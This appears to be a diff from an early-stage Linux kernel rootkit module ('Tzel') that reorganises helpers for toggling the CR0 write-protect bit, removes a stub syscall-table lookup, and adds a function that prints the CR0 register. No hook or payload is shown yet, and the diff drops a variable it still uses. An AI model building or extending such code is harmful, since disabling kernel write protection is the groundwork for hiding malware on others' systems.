@@ -9,31 +9,23 @@
 #include <linux/version.h>
 #include <asm/paravirt.h>
 
-static unsigned long *sys_call_table;
-static unsigned long orig_cr0;
 
 static inline void write_cr0_forced(unsigned long val)
 {
     asm volatile("mov %0,%%cr0": "+r" (val), "+m" (__force_order));
 }
 
-static inline void protect_memory(void)
+static inline void unprotect_memory(void)
 {
-    orig_cr0 = read_cr0();
     write_cr0_forced(orig_cr0 & (~X86_CR0_WP));
 }
 
-static inline void unprotect_memory(void)
+static inline void protect_memory(void)
 {
-    write_cr0_forced(orig_cr0);
+    write_cr0_forced(orig_cr0 | X86_CR0_WP);
 }
 
-static long * get_sys_call_table(void) 
-{
-    return NULL;
-}
-
-static int __init init_rootkit(void)
+static void test_memory_protection(void)
 {
     unsigned long cr0;
     printk(KERN_INFO "Loading Tzel.\n");
@@ -52,6 +44,11 @@ static int __init init_rootkit(void)
 
     cr0 = read_cr0();
     printk(KERN_INFO "cr0: %lx\n", cr0);
+}
+
+static int __init init_rootkit(void)
+{
+    test_memory_protection();
 
     return 0;
 }
